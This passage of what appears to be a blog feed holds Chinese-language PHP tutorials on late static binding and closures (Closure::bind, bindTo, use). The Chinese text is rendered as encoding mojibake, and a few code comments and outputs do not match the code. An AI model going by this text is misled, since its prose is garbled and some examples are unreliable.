çˆ¶ç±»ï¼‰ï¼Œå½“åœ¨çˆ¶ç±»<code>A</code>ä¸­æ‰¾åˆ°æ—¶ï¼Œæ‰§è¡Œ<code>static::who()</code>ã€‚ï¼ˆè¿™é‡Œçš„<code>static</code>ä¸æˆ‘ä»¬å¸¸ç”¨çš„<code>self</code>å…³é”®å­—ä¸åŒï¼Œå¦‚æœæ˜¯<code>self</code>ï¼Œåˆ™åªä¼šå‘ä¸ŠæŸ¥æ‰¾ï¼Œè€Œ<code>static</code>åˆ™ä¼šå‘ä¸‹æŸ¥æ‰¾ï¼Œå…·ä½“è°ƒç”¨æ–¹æ³•ä¹Ÿæ˜¯åœ¨è¿è¡Œæ—¶ç¡®å®šçš„ï¼‰å› æ­¤æ¥ä¸‹æ¥è°ƒç”¨çš„æ˜¯<code>B</code>ä¸­çš„ <code>who()</code>ï¼Œè€Œé<code>A</code>ä¸­çš„<code>who()</code>ï¼Œæœ€ç»ˆä¹Ÿå°±è‡ªç„¶è¾“å‡ºä¸º<code>B</code>ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒåæœŸé™æ€ç»‘å®šçš„è§£æä¼šä¸€ç›´åˆ°å–å¾—ä¸€ä¸ªå®Œå…¨è§£æäº†çš„é™æ€è°ƒç”¨ä¸ºæ­¢(å³æœ€ä¸‹å±‚å¯æ‰§è¡Œçš„æ–¹æ³•)ã€‚å¦ä¸€æ–¹é¢ï¼Œå¦‚æœé™æ€è°ƒç”¨ä½¿ç”¨ <code>parent::</code> æˆ–è€… <code>self::</code> å°†è½¬å‘è°ƒç”¨ä¿¡æ¯ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">static</span>::who();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        A::foo();</span><br><span class="line">        <span class="keyword">parent</span>::foo();</span><br><span class="line">        <span class="keyword">self</span>::foo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> <span class="keyword">extends</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">who</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__CLASS__</span>.<span class="string">"\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">C::test();<span class="comment">// A C C</span></span><br></pre></td></tr></table></figure><h2 id="What-amp-When"><a href="#What-amp-When" class="headerlink" title="What &amp; When"></a>What &amp; When</h2><p>ç°åœ¨ï¼Œè®©æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯<code>static</code>ï¼Œä»¥åŠä»€ä¹ˆæ—¶å€™è¯¥ä½¿ç”¨<code>static</code>ã€‚</p><h3 id="ä»€ä¹ˆæ˜¯staticï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯staticï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯staticï¼Ÿ"></a>ä»€ä¹ˆæ˜¯staticï¼Ÿ</h3><p>å¦‚æœæˆ‘ä»¬åœ¨ä»£ç ä¸­å£°æ˜äº†<code>static</code>å…³é”®å­—ï¼Œä»£ç åœ¨åˆå§‹åŒ–é˜¶æ®µä¼šä¸å¸¸é‡ã€å…¨å±€å˜é‡ä¸€åŒå­˜å‚¨åœ¨ä¸€æ®µè¿ç»­ç©ºé—´å†…ï¼ˆé™æ€å­˜å‚¨åŒºï¼‰ï¼Œè¿™ä¼šå­˜åœ¨äºæ•´ä¸ªè¯·æ±‚å‘¨æœŸï¼Œé™¤éæˆ‘ä»¬æ‰‹åŠ¨é”€æ¯ã€‚</p><p>ç”±äºè¿™äº›å€¼æ˜¯åœ¨åˆå§‹åŒ–æ—¶ç¡®å®šçš„ï¼Œç›¸æ¯”äºåœ¨è¿è¡Œæ—¶ç¡®å®šçš„å€¼ï¼Œå°±æ˜¯â€œé™æ€â€(<code>static</code>)çš„ã€‚</p><h3 id="ä»€ä¹ˆæ—¶å€™ç”¨ï¼Ÿ"><a href="#ä»€ä¹ˆæ—¶å€™ç”¨ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ—¶å€™ç”¨ï¼Ÿ"></a>ä»€ä¹ˆæ—¶å€™ç”¨ï¼Ÿ</h3><p>ç”±äºæ˜¯ä¸€æ®µè¿ç»­çš„ç©ºé—´ï¼Œç›¸æ¯”äºè¿è¡Œæ—¶çš„ç¢ç‰‡åŒ–äº§ç”Ÿçš„å†…å®¹è¯»å–æ•ˆç‡æ›´é«˜ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åº”å°†ä¸€äº›å¸¸ç”¨åŸºç¡€å·¥å…·ç±»è®¾ä¸ºé™æ€ï¼Œæ—¢é¿å…äº†å®ä¾‹åŒ–æ—¶çš„èµ„æºæ¶ˆè€—ï¼Œæœ‰æå‡äº†ä¹¦å†™ä½“éªŒã€‚ä½†è¦æ³¨æ„ä¸èƒ½æ»¥ç”¨<code>static</code>ï¼Œæ›¾ç»çš„ä¸€å®¶çŸ¥åå…¬å¸å†…éƒ¨é¡¹ç›®modelå±‚å…¨éƒ¨æ˜¯<code>static</code>æ–¹æ³•ï¼Œä½ èƒ½æƒ³è±¡åˆ°è¿™ç»´æŠ¤èµ·æ¥æœ‰å¤šä¹ˆè®©äººå´©æºƒã€‚</p><hr><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><ol><li><a href="https://www.php.net/manual/zh/language.variables.scope.php" target="_blank" rel="noopener">ä½¿ç”¨é™æ€å˜é‡ - PHPæ‰‹å†Œ</a></li><li><a href="https://www.php.net/manual/zh/language.oop5.late-static-bindings.php" target="_blank" rel="noopener">åæœŸé™æ€ç»‘å®š - PHPæ‰‹å†Œ</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> è½¯ä»¶ç¼–ç¨‹ </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æµ…è°ˆphpé—­åŒ…/åŒ¿åå‡½æ•°</title>
      <link href="/post/php-closure/"/>
      <url>/post/php-closure/</url>
      
        <content type="html"><![CDATA[<p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g8cm61t85qj30bo06o3ym.jpg" alt=""></p><p>é—­åŒ…(Closure)æ˜¯æˆ‘ä»¬åœ¨ç¼–ç¨‹ä¸­ç»å¸¸é‡åˆ°çš„ä¸€ä¸ªæ¦‚å¿µï¼Œä½†é—­åŒ…ç©¶ç«Ÿæ˜¯ä»€ä¹ˆï¼Ÿåˆæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ</p><a id="more"></a><p>åœ¨ç¼–ç¨‹ä¸­ï¼Œé—­åŒ…ä¸åŒ¿åå‡½æ•°ï¼ˆåˆålambdaè¡¨è¾¾å¼ï¼‰å…¶å®æ˜¯ä¸åŒçš„æ¦‚å¿µï¼Œä½†ä¸¤è€…ç»å¸¸åŒæ—¶ä½¿ç”¨ã€‚åœ¨ PHP ä¸­ï¼ŒäºŒè€…çš„æ¦‚å¿µä¸åšåŒºåˆ†ï¼Œä¸‹æ–‡å‡ä»¥é—­åŒ…æŒ‡ä»£ã€‚</p><h2 id="I-é—­åŒ…æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#I-é—­åŒ…æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="I. é—­åŒ…æ˜¯ä»€ä¹ˆï¼Ÿ"></a>I. é—­åŒ…æ˜¯ä»€ä¹ˆï¼Ÿ</h2><h3 id="é—­åŒ…çš„å¸¸ç”¨ç±»å‹"><a href="#é—­åŒ…çš„å¸¸ç”¨ç±»å‹" class="headerlink" title="é—­åŒ…çš„å¸¸ç”¨ç±»å‹"></a>é—­åŒ…çš„å¸¸ç”¨ç±»å‹</h3><p>é—­åŒ…åˆååŒ¿åå‡½æ•°ï¼Œä¹Ÿå°±æ˜¯æ²¡æœ‰å‡½æ•°åç§°çš„å‡½æ•°ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸‹å¸¸ç”¨ç±»å‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// å®šä¹‰ä¸€ä¸ªé—­åŒ…ï¼Œå¹¶æŠŠå®ƒèµ‹ç»™å˜é‡ $closure</span></span><br><span class="line">$closure = <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½¿ç”¨é—­åŒ…ä¹Ÿå¾ˆç®€å•</span></span><br><span class="line">$closure(); <span class="comment">//è¿™æ ·å°±è°ƒç”¨äº†é—­åŒ…ï¼Œè¾“å‡º 7</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœè¦å³æ—¶è°ƒç”¨é—­åŒ…ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥è¿™æ ·å†™</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">7</span>;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="comment">// å½“ç„¶æ›´å¤šçš„æ—¶å€™æ˜¯æŠŠé—­åŒ…ä½œä¸ºå‚æ•°(å›è°ƒå‡½æ•°)ä¼ é€’ç»™å‡½æ•°</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">testClosure</span> <span class="params">(Closure $callback)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $callback();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $closure ä½œä¸ºå‚æ•°ä¼ é€’ç»™å‡½æ•° testClosureï¼Œå¦‚æœæ˜¯æ™®é€šå‡½æ•°æ˜¯æ²¡æœ‰åŠæ³•ä½œä¸ºtestClosureçš„å‚æ•°çš„</span></span><br><span class="line">testClosure($closure);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¹Ÿå¯ä»¥ç›´æ¥å°†å®šä¹‰çš„é—­åŒ…ä½œä¸ºå‚æ•°ä¼ é€’ï¼Œè€Œä¸ç”¨æå‰èµ‹ç»™å˜é‡</span></span><br><span class="line">testClosure (<span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// é—­åŒ…ä¸æ­¢å¯ä»¥åšå‡½æ•°çš„å‚æ•°ï¼Œä¹Ÿå¯ä»¥ä½œä¸ºå‡½æ•°çš„è¿”å›å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getClosure</span> <span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="number">7</span>; &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$c = getClosure(); <span class="comment">// å‡½æ•°è¿”å›çš„é—­åŒ…å°±å¤åˆ¶ç»™ $c äº†</span></span><br><span class="line">$c(); <span class="comment">// è°ƒç”¨é—­åŒ…ï¼Œè¿”å› 7</span></span><br></pre></td></tr></table></figure><h3 id="é—­åŒ…ç±»"><a href="#é—­åŒ…ç±»" class="headerlink" title="é—­åŒ…ç±»"></a>é—­åŒ…ç±»</h3><p>å®šä¹‰ä¸€ä¸ªé—­åŒ…å‡½æ•°ï¼Œå…¶å®æ˜¯äº§ç”Ÿäº†ä¸€ä¸ªé—­åŒ…ç±»ï¼ˆClosureï¼‰çš„å¯¹è±¡ï¼ŒClosure ç±»æ‘˜è¦å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Closure &#123;</span><br><span class="line">    <span class="comment">// ç”¨äºç¦æ­¢å®ä¾‹åŒ–çš„æ„é€ å‡½æ•°</span></span><br><span class="line">    __construct ( void )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¤åˆ¶ä¸€ä¸ªé—­åŒ…ï¼Œç»‘å®šæŒ‡å®šçš„$thiså¯¹è±¡å’Œç±»ä½œç”¨åŸŸ</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> bind ( Closure $closure , object $newthis [, mixed $newscope = <span class="string">'static'</span> ] ) : Closure</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// å¤åˆ¶å½“å‰é—­åŒ…å¯¹è±¡ï¼Œç»‘å®šæŒ‡å®šçš„$thiså¯¹è±¡å’Œç±»ä½œç”¨åŸŸ</span></span><br><span class="line">    <span class="keyword">public</span> bindTo ( object $newthis [, mixed $newscope = <span class="string">'static'</span> ] ) : Closure</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡<code>var_dump($c instanceof Closure);</code>çœ‹åˆ°ï¼Œé—­åŒ…ç¡®å®æ˜¯<code>Closure</code>çš„ä¸€ä¸ªå®ä¾‹ï¼Œé€šè¿‡<code>var_dump(is_callable($c));</code>çœ‹åˆ°ï¼Œé—­åŒ…æ˜¯<code>Callable</code>çš„æ•°æ®ç±»å‹ã€‚</p><h4 id="Closure-bind-å®ä¾‹"><a href="#Closure-bind-å®ä¾‹" class="headerlink" title="Closure::bind() å®ä¾‹"></a><code>Closure::bind()</code> å®ä¾‹</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> $cat = <span class="string">"cat"</span>;  </span><br><span class="line">    <span class="keyword">private</span> $dog = <span class="string">"dog"</span>;  </span><br><span class="line">    <span class="keyword">public</span> $pig = <span class="string">"pig"</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * è·å–Animalç±»é™æ€ç§æœ‰æˆå‘˜å±æ€§ </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line">$cat = <span class="keyword">static</span> <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> Animal::$cat;  </span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * è·å–Animalå®ä¾‹ç§æœ‰æˆå‘˜å±æ€§ </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line">$dog = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;dog;  </span><br><span class="line">&#125;;  </span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> * è·å–Animalå®ä¾‹å…¬æœ‰æˆå‘˜å±æ€§ </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line">$pig = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;pig;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">$bindCat = Closure::bind($cat, <span class="keyword">null</span>, <span class="keyword">new</span> Animal());<span class="comment">// ç»™é—­åŒ…ç»‘å®šäº†Animalå®ä¾‹çš„ä½œç”¨åŸŸï¼Œä½†æœªç»™é—­åŒ…ç»‘å®š$thiså¯¹è±¡ã€‚è¿™æ˜¯ç”±äºé™æ€é—­åŒ…ä¸èƒ½æœ‰ç»‘å®šçš„å¯¹è±¡ï¼ˆ newthis å‚æ•°çš„å€¼åº”è¯¥è®¾ä¸º NULLï¼‰(è¯¦æƒ…è¯·æŸ¥çœ‹æ‰‹å†Œ[Closure::bindToé¡µé¢æ–‡æ¡£](https://www.php.net/manual/zh/closure.bindto.php))</span></span><br><span class="line"></span><br><span class="line">$bindCat = Closure::bind($cat, <span class="keyword">new</span> Animal(), <span class="string">'Animal'</span>);<span class="comment">// è‹¥$catä¸æ˜¯é™æ€é—­åŒ…æ—¶æœ‰æ•ˆ</span></span><br><span class="line"></span><br><span class="line">$bindDog = Closure::bind($dog, <span class="keyword">new</span> Animal(), <span class="string">'Animal'</span>);<span class="comment">// ç»™é—­åŒ…ç»‘å®šäº†Animalç±»çš„ä½œç”¨åŸŸï¼ŒåŒæ—¶å°†Animalå®ä¾‹å¯¹è±¡ä½œä¸º$thiså¯¹è±¡ç»‘å®šç»™é—­åŒ…  </span></span><br><span class="line"></span><br><span class="line">$bindPig = Closure::bind($pig, <span class="keyword">new</span> Animal());<span class="comment">// å°†Animalå®ä¾‹å¯¹è±¡ä½œä¸º$thiså¯¹è±¡ç»‘å®šç»™é—­åŒ…,ä¿ç•™é—­åŒ…åŸæœ‰ä½œç”¨åŸŸ  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $bindCat(),PHP_EOL;<span class="comment">// æ ¹æ®ç»‘å®šè§„åˆ™ï¼Œå…è®¸é—­åŒ…é€šè¿‡ä½œç”¨åŸŸé™å®šæ“ä½œç¬¦è·å–Animalç±»é™æ€ç§æœ‰æˆå‘˜å±æ€§  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $bindDog(),PHP_EOL;<span class="comment">// æ ¹æ®ç»‘å®šè§„åˆ™ï¼Œå…è®¸é—­åŒ…é€šè¿‡ç»‘å®šçš„$thiså¯¹è±¡(Animalå®ä¾‹å¯¹è±¡)è·å–Animalå®ä¾‹ç§æœ‰æˆå‘˜å±æ€§  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $bindPig(),PHP_EOL;<span class="comment">// æ ¹æ®ç»‘å®šè§„åˆ™ï¼Œå…è®¸é—­åŒ…é€šè¿‡ç»‘å®šçš„$thiså¯¹è±¡è·å–Animalå®ä¾‹å…¬æœ‰æˆå‘˜å±æ€§</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// bindToä¸bindç±»ä¼¼ï¼Œæ˜¯é¢å‘å¯¹è±¡çš„è°ƒç”¨æ–¹å¼ï¼Œè¿™é‡Œåªä¸¾ä¸€ä¸ªï¼Œå…¶ä»–ç±»æ¯”å°±å¯ä»¥</span></span><br><span class="line">$bindCat = $cat-&gt;bindTo(<span class="keyword">null</span>, <span class="string">'Animal'</span>);<span class="comment">// åŒæ ·çš„ï¼Œé™æ€é—­åŒ…ä¸èƒ½ç»‘å®šå¯¹è±¡ï¼Œå› æ­¤$newthisä¸º null</span></span><br><span class="line"><span class="keyword">echo</span> $bindCat(); <span class="comment">// cat</span></span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœæœªèƒ½æŒ‡å®šä½œç”¨åŸŸçš„èŒƒå›´ï¼Œç»‘å®šåçš„é—­åŒ…åªèƒ½è®¿é—®<code>public</code>å±æ€§çš„å€¼ã€‚</p></blockquote><h4 id="Closure-bindTo-å®ä¾‹"><a href="#Closure-bindTo-å®ä¾‹" class="headerlink" title="Closure::bindTo() å®ä¾‹"></a><code>Closure::bindTo()</code> å®ä¾‹</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;val = $val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getClosure</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//returns closure bound to this object and scope</span></span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;val; &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ob1 = <span class="keyword">new</span> A(<span class="number">1</span>);</span><br><span class="line">$ob2 = <span class="keyword">new</span> A(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">$cl = $ob1-&gt;getClosure();</span><br><span class="line"><span class="keyword">echo</span> $cl(), PHP_EOL;<span class="comment">// 1</span></span><br><span class="line">$cl = $cl-&gt;bindTo($ob2);<span class="comment">// å®ƒä¸å½“å‰å¯¹è±¡çš„å‡½æ•°ä½“ç›¸åŒã€ç»‘å®šäº†åŒæ ·å˜é‡ï¼Œä½†å¯ä»¥ç»‘å®šä¸åŒçš„å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥ç»‘å®šæ–°çš„ç±»ä½œç”¨åŸŸ</span></span><br><span class="line"><span class="keyword">echo</span> $cl(), PHP_EOL;<span class="comment">// 2</span></span><br></pre></td></tr></table></figure><h2 id="II-é—­åŒ…æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"><a href="#II-é—­åŒ…æœ‰ä»€ä¹ˆç”¨ï¼Ÿ" class="headerlink" title="II. é—­åŒ…æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"></a>II. é—­åŒ…æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h2><h3 id="1-å‚¨å­˜å˜é‡"><a href="#1-å‚¨å­˜å˜é‡" class="headerlink" title="1. å‚¨å­˜å˜é‡"></a>1. å‚¨å­˜å˜é‡</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makeHelloWorld</span><span class="params">($name)</span> </span>&#123; </span><br><span class="line">    $i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="function"><span class="keyword">function</span><span class="params">()</span> <span class="title">use</span> <span class="params">($name, &amp;$i)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">echo</span> $name; $i++; <span class="keyword">echo</span> $i.<span class="string">"\n"</span>; &#125;; </span><br><span class="line">&#125; </span><br><span class="line">$hello1 = makeHelloWorld(<span class="string">"wuying"</span>); </span><br><span class="line">$hello2 = makeHelloWorld(<span class="string">"wuying1"</span>); </span><br><span class="line">$hello1(); <span class="comment">//wuying1</span></span><br><span class="line">$hello1(); <span class="comment">//wuying2</span></span><br><span class="line">$hello1(); <span class="comment">//wuying3</span></span><br><span class="line">$hello2(); <span class="comment">//wuying11</span></span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œ<code>$hello1 = makeHelloWorld(&quot;wuying&quot;);</code>çš„ä½œç”¨æ˜¯å°†å‚æ•°<code>wuying1</code>ä¼ é€’ç»™<code>makeHelloWorld()</code>ï¼Œå¹¶æ¥æ”¶å…¶ä¸­çš„é—­åŒ…ä½œä¸ºè¿”å›å€¼ï¼Œå› æ­¤ï¼Œ<code>$hello1</code>ä¾¿æˆä¸ºäº†é—­åŒ…ï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ<code>$hello1()</code>æ—¶ï¼Œé—­åŒ…å¼€å§‹æ‰§è¡Œã€‚ç”±äºå¼•ç”¨äº†é—­åŒ…å¤–çš„å˜é‡<code>$i</code>ï¼Œæ‰€ä»¥æ¯æ¬¡çš„æ‰§è¡Œéƒ½ä¿®æ”¹äº†<code>$i</code>ï¼Œæ‰€ä»¥æœ€åä¾æ¬¡è¾“å‡ºäº†<code>wuying1</code>ã€<code>wuying2</code>ã€<code>wuying3</code>ã€‚</p><p>é‚£ä¹ˆï¼Œä¸ºä»€ä¹ˆé—­åŒ…å¯ä»¥å­˜å‚¨å˜é‡å‘¢ï¼Ÿè¿™æ˜¯å› ä¸ºåœ¨æ²¡æœ‰é—­åŒ…çš„è¯­è¨€ä¸­ï¼Œå˜é‡çš„ç”Ÿå‘½å‘¨æœŸåªé™äºåˆ›å»ºå®ƒçš„ç¯å¢ƒã€‚ä½†åœ¨æœ‰é—­åŒ…çš„è¯­è¨€ä¸­ï¼Œåªè¦æœ‰ä¸€ä¸ªé—­åŒ…å¼•ç”¨äº†è¿™ä¸ªå˜é‡ï¼Œå®ƒå°±ä¼šä¸€ç›´å­˜åœ¨ã€‚</p><blockquote><p>å¦ä¸€ç§åœ¨å±€éƒ¨å‡½æ•°ä¸­å‚¨å­˜å˜é‡çš„æ–¹å¼æ˜¯ä½¿ç”¨<code>static</code>å…³é”®å­—ï¼Œå…¶åŸç†æ˜¯å°†å˜é‡å­˜å‚¨äºé™æ€å­˜å‚¨åŒºï¼Œè€Œéæ™®é€šå˜é‡å­˜å‚¨çš„æ ˆåŒºï¼Œè¯¦è§å¦ä¸€ç¯‡æ–‡ç« <a 